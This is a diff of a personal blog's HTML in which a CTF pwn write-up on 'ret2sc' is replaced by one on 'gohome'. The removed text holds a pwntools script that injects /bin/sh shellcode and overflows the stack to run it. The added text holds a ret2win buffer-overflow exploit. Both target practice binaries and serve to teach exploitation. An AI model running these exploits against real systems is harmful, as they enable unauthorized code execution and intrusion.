@@ -16,27 +16,29 @@
   <meta name="author" content="Xiung">
   <meta name="keywords" content="">
   
-    <meta name="description" content="file ret2sc to take a look. 1234$ file ret2scret2sc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sh">
+    <meta name="description" content="use file &lt;file&gt; to take a look. It’s a ELF file, not stripped.1234$ file gohomegohome: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,interpreter &#x2F;lib64&#x2F;ld-linux-x86-64">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ret2sc">
-<meta property="og:url" content="http://example.com/2021/11/01/ret2sc/index.html">
+<meta property="og:title" content="Writeup-gohome">
+<meta property="og:url" content="http://example.com/2021/11/01/Writeup-gohome/index.html">
 <meta property="og:site_name" content="Xiung&#39;s Blog">
-<meta property="og:description" content="file ret2sc to take a look. 1234$ file ret2scret2sc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sh">
+<meta property="og:description" content="use file &lt;file&gt; to take a look. It’s a ELF file, not stripped.1234$ file gohomegohome: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,interpreter &#x2F;lib64&#x2F;ld-linux-x86-64">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.imgur.com/kkBkEOG.png">
-<meta property="og:image" content="https://i.imgur.com/WQSd5Zm.png">
-<meta property="article:published_time" content="2021-11-01T14:57:16.000Z">
-<meta property="article:modified_time" content="2022-10-02T09:38:44.551Z">
+<meta property="og:image" content="https://i.imgur.com/YsoMUcS.png">
+<meta property="og:image" content="https://i.imgur.com/EFXiT2J.png">
+<meta property="og:image" content="https://i.imgur.com/9eNQ6Rq.png">
+<meta property="og:image" content="https://i.imgur.com/RISfNKD.png">
+<meta property="article:published_time" content="2021-11-01T07:46:48.000Z">
+<meta property="article:modified_time" content="2022-10-02T10:05:00.028Z">
 <meta property="article:author" content="Xiung">
 <meta property="article:tag" content="CyberSecurity">
 <meta property="article:tag" content="PWN">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://i.imgur.com/kkBkEOG.png">
+<meta name="twitter:image" content="https://i.imgur.com/YsoMUcS.png">
   
   
   
-  <title>ret2sc - Xiung&#39;s Blog</title>
+  <title>Writeup-gohome - Xiung&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -201,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="ret2sc"></span>
+            <span id="subtitle" data-typed-text="Writeup-gohome"></span>
           
         </div>
 
@@ -212,7 +214,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2021-11-01 22:57" pubdate>
+        <time datetime="2021-11-01 15:46" pubdate>
           November 1, 2021 pm
         </time>
       </span>
@@ -224,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.2k words
+          1.1k words
         
       </span>
     
@@ -235,7 +237,7 @@
         
         
         
-          19 mins
+          10 mins
         
       </span>
     
@@ -273,39 +275,34 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">ret2sc</h1>
+            <h1 style="display: none">Writeup-gohome</h1>
             
             
               <div class="markdown-body">
                 
                 <ol>
-<li><p><code>file ret2sc</code> to take a look.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ file ret2sc<br>ret2sc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), <br>dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, <br>BuildID[sha1]=b83f13f0a84fdae7a5bc54d828d0e4ea15575d6d, not stripped<br></code></pre></td></tr></table></figure>
+<li>use <code>file &lt;file&gt;</code> to take a look. It’s a ELF file, not stripped.<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ file gohome<br>gohome: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,<br>interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, <br>BuildID[sha1]=63cc39d0f4f93acc2ee50813f4f82c8ed43d9135, not stripped<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>2.use <code>gdb-peda checksec</code> to make sure whether it have protection of the program. by the result, we know that only NX protection is open.<br><img src="https://i.imgur.com/YsoMUcS.png" srcset="/img/loading.gif" lazyload alt="Image"> </p>
+<ol start="3">
+<li><p><code>r2 &lt;file&gt;</code>, <code>aa</code>, <code>afl</code>, there’s some function we can pay attention to.<br><img src="https://i.imgur.com/EFXiT2J.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
 </li>
-<li><p>gdb checksec to check the protection of this program.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb-peda ret2sc<br>Reading symbols from ret2sc...<br>(No debugging symbols found <span class="hljs-keyword">in</span> ret2sc)<br>gdb-peda$ checksec<br>CANARY    : disabled<br>FORTIFY   : disabled<br>NX        : disabled<br>PIE       : disabled<br>RELRO     : Partial<br>gdb-peda$<br></code></pre></td></tr></table></figure>
+<li><p>first, <code>s main</code>, <code>VV</code> to take a look.<br><img src="https://i.imgur.com/9eNQ6Rq.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
 </li>
-<li><p><code>r2 ret2sc</code>, there’s nothing special.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ r2 ret2sc<br>[0x00400540]&gt; aa<br>[x] Analyze all flags starting with sym. and entry0 (aa)<br>[0x00400540]&gt; afl<br>0x00400540    1 41           entry0<br>0x00400500    1 6            sym.imp.__libc_start_main<br>0x00400570    4 50   -&gt; 41   sym.deregister_tm_clones<br>0x004005b0    4 58   -&gt; 55   sym.register_tm_clones<br>0x004005f0    3 28           sym.__do_global_dtors_aux<br>0x00400610    4 38   -&gt; 35   entry.init0<br>0x00400720    1 2            sym.__libc_csu_fini<br>0x00400724    1 9            sym._fini<br>0x004006b0    4 101          sym.__libc_csu_init<br>0x00400636    1 114          main<br>0x00400520    1 6            sym.imp.setvbuf<br>0x004004e0    1 6            sym.imp.printf<br>0x004004f0    1 6            sym.imp.read<br>0x00400510    1 6            sym.imp.gets<br>0x004004b0    3 26           sym._init<br>0x00400530    1 6            sym..plt.got<br>[0x00400540]&gt;<br></code></pre></td></tr></table></figure>
-</li>
-<li><p><code>s main</code>, <code>VV</code>. We saw there are two input, one is “name”, another is “try your best:”. the first will be put at <strong>0x601080</strong>, second will be put at <strong>var_20h(rbp-0x20)</strong>.</p>
+<li><p>by the code, we know that the program will exit after gets function get our user input. And our input will be put at <strong>var_20h(rpb-0x20)</strong>. Let’s go back to see Billyhouse function.</p>
 </li>
 </ol>
-<p><img src="https://i.imgur.com/kkBkEOG.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
-<ol start="5">
-<li>by the result above, we need to find the place that we can inject our shellcode, use gdb-peda.<br><code>gde-peda ret2sc</code>, <code>b main</code>, <code>r</code></li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb-peda ret2sc<br>Reading symbols from ret2sc...<br>(No debugging symbols found <span class="hljs-keyword">in</span> ret2sc)<br>gdb-peda$ b main<br>Breakpoint 1 at 0x40063a<br>gdb-peda$ r<br></code></pre></td></tr></table></figure>
-
-<p>then <code>vmmap</code>, we found that address between 0x601000-0x602000 have permission of rwx, and our input “name” (0x601080) is in this range. so we can inject our shellcode here.</p>
-<p><img src="https://i.imgur.com/WQSd5Zm.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<p><img src="https://i.imgur.com/RISfNKD.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
 <ol start="6">
-<li>write the exploit script, shellcode can be found on the <a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes">exploit-db</a> website.</li>
+<li><p>we notice that this program will print flag which we want to get. So, what we need to do is to let the program jump here to run this function.</p>
+</li>
+<li><p>count to overwrite the stack and rbp address until the return address. we need to BOF all of them, put the Billyhouse function address to the return address. Bellow is our exploit script.</p>
+</li>
 </ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>ip = <span class="hljs-string">&quot;120.114.62.211&quot;</span><br>port = <span class="hljs-number">2122</span><br><br><span class="hljs-comment"># r = remote(ip,port)</span><br>r = process(<span class="hljs-string">&quot;./ret2sc&quot;</span>)<br><br>shellcode =\<br><span class="hljs-string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br><br>r.sendafter(<span class="hljs-string">&quot;:&quot;</span>, shellcode)<br><span class="hljs-comment"># r.recvuntil(&#x27;:&#x27;)</span><br><span class="hljs-comment"># r.sendline(shellcode)</span><br><br>shellcode_address = <span class="hljs-number">0x601080</span><br>r.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br>r.sendline(<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x28</span> + p64(shellcode_address))<br><br>r.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;./gohome&#x27;</span>)<br><span class="hljs-comment">#r = remote(&#x27;120.114.62.211&#x27;, 6126)</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">40</span><br><br>r.sendline(payload + p64(<span class="hljs-number">0x004006c6</span>))  <span class="hljs-comment">#if 64 bit ,or 32bit use p32</span><br><br>r.interactive()<br></code></pre></td></tr></table></figure>
 
-<ol start="7">
-<li>run the code and then we can get the shell, find the flag and print it.</li>
+<ol start="8">
+<li>run the program and we can get the flag.</li>
 </ol>
 
                 
@@ -325,7 +322,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Write-up/" class="category-chain-item">Write-up</a>
+  <a href="/categories/Writeup/" class="category-chain-item">Writeup</a>
   
   
 
@@ -356,8 +353,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>ret2sc</div>
-      <div>http://example.com/2021/11/01/ret2sc/</div>
+      <div>Writeup-gohome</div>
+      <div>http://example.com/2021/11/01/Writeup-gohome/</div>
     </div>
     <div class="license-meta">
       
@@ -401,9 +398,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/11/03/ROP/" title="ROP">
+                      <a href="/2021/11/01/Writeup-ret2win/" title="Writeup-ret2win">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ROP</span>
+                        <span class="hidden-mobile">Writeup-ret2win</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -411,8 +408,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/11/01/ret2win/" title="ret2win">
-                        <span class="hidden-mobile">ret2win</span>
+                      <a href="/2021/08/06/John-The-Ripper/" title="John The Ripper">
+                        <span class="hidden-mobile">John The Ripper</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
